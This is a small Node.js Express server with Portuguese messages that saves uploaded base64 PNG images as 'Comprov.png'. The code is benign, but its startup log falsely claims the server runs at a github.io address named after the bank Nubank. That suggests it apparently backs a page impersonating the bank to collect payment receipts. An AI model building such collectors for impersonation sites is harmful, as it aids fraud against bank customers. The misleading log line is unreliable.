const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();
const port = 3500;

app.use(express.json({ limit: '20mb' }));

app.post('/upload', (req, res) => {
    try {
        const imageData = req.body.image.replace(/^data:image\/png;base64,/, '');
        const buffer = Buffer.from(imageData, 'base64');

        fs.writeFile('Comprov.png', buffer, (err) => {
            if (err) {
                console.error('Erro ao salvar a imagem:', err);
                res.status(500).send('Erro ao salvar a imagem');
            } else {
                console.log('Imagem salva com sucesso');
                res.status(200).send('Imagem salva com sucesso');
            }
        });
    } catch (error) {
        console.error('Erro ao processar a imagem:', error);
        res.status(500).send('Erro ao processar a imagem');
    }
});

app.listen(port, () => {
    console.log(`Servidor rodando em https://usd55.github.io/nuBank.github.io/`);
});
